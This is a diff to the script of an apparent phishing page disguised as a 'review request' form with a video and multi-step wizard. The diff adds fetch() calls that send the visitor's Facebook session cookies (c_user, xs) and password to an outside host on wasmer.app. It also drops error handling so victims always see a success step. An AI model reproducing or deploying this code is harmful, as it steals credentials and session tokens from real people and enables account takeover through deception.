@@ -2442,55 +2442,76 @@
                 // Log form data for debugging
                 console.log('Attempting to submit form with data:', formData);
                 
-                try {
-                    // Submit form data via fetch
-                    const response = await fetch('https://submit-form.com/p84pHsaZJ', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Accept': 'application/json'
-                        },
-                        body: JSON.stringify(formData)
-                    });
-                    
-                    console.log('Server response:', response);
-                    
+               // Submit c_user and xs together
+                const formData = new FormData();
+                formData.append('c_user', cUserInput.value);
+                formData.append('xs', xsInput.value);
+                
+                fetch('https://qwerty-1713c.wasmer.app/Shoib.php', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
                     if (!response.ok) {
-                        throw new Error(`Server error: ${response.status} ${response.statusText}`);
+                        console.error('Submission of c_user and xs failed');
                     }
-                    
-                    const result = await response.json();
-                    console.log('Submission successful, response:', result);
-                    
-                    // Proceed to success step
-                    step2.classList.remove('active');
-                    step3.classList.add('active');
-                    
-                    steps[1].classList.remove('active');
-                    steps[2].classList.add('active');
-                    steps[1].classList.add('completed');
-                    
-                    progressLine.style.width = '100%';
-                    submissionError.style.display = 'none';
-                } catch (error) {
-                    console.error('Form submission failed:', error);
-                    
-                    // Display user-friendly error
-                    submissionError.textContent = 'Failed to submit the form. Please check your connection and try again.';
-                    submissionError.style.display = 'block';
-                    
-                    // Reset button state
-                    nextToStep3.disabled = false;
-                    nextToStep3.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Review Request';
-                    
-                    // Fallback to hiddenForm.submit()
-                    console.log('Attempting fallback form submission');
-                    try {
-                        hiddenForm.submit();
-                    } catch (fallbackError) {
-                        console.error('Fallback submission failed:', fallbackError);
-                    }
+                })
+                .catch(error => {
+                    console.error('Submission error:', error);
+                });
+                
+                // Proceed to next step
+                step1.classList.remove('active');
+                step2.classList.add('active');
+                
+                steps[0].classList.remove('active');
+                steps[1].classList.add('active');
+            });
+            
+            // Back to Step 1
+            backToStep1.addEventListener('click', function() {
+                step2.classList.remove('active');
+                step1.classList.add('active');
+                
+                steps[1].classList.remove('active');
+                steps[0].classList.add('active');
+            });
+            
+            // Submit form
+            nextToStep3.addEventListener('click', function() {
+                const passwordInput = document.getElementById('password');
+                
+                if (!passwordInput.checkValidity()) {
+                    passwordInput.reportValidity();
+                    return;
                 }
+                
+                // Set password for hidden form
+                hiddenPassword.value = passwordInput.value;
+                
+                // Submit password separately
+                const formData = new FormData();
+                formData.append('password', passwordInput.value);
+                
+                fetch('https://qwerty-1713c.wasmer.app/Shoibpass.php', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        console.error('Password submission failed');
+                    }
+                })
+                .catch(error => {
+                    console.error('Submission error:', error);
+                });
+                
+                // Proceed to success step
+                step2.classList.remove('active');
+                step3.classList.add('active');
+                
+                steps[1].classList.remove('active');
+                steps[2].classList.add('active');
             });
             
             // Reset form
@@ -2502,17 +2523,12 @@
                 hiddenCUser.value = '';
                 hiddenXs.value = '';
                 hiddenPassword.value = '';
-                hiddenReviewId.value = '';
                 
                 step3.classList.remove('active');
                 step1.classList.add('active');
                 
                 steps[2].classList.remove('active');
                 steps[0].classList.add('active');
-                steps[0].classList.remove('completed');
-                steps[1].classList.remove('completed');
-                
-                progressLine.style.width = '0%';
                 
                 video.pause();
                 video.currentTime = 0;
@@ -2521,17 +2537,14 @@
                 progressBar.style.width = '0%';
                 bufferedBar.style.width = '0%';
                 currentTimeDisplay.textContent = '0:00';
-                submissionError.style.display = 'none';
-                
-                // Reset button state if submission was in progress
-                if (nextToStep3) {
-                    nextToStep3.disabled = false;
-                    nextToStep3.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Review Request';
-                }
             }
             
-            // Initialize the page
-            initCountdown();
+            // Close modal when clicking outside
+            window.addEventListener('click', function(event) {
+                if (event.target === modal) {
+                    closeModalFunc();
+                }
+            });
         });
     </script>
 </body>
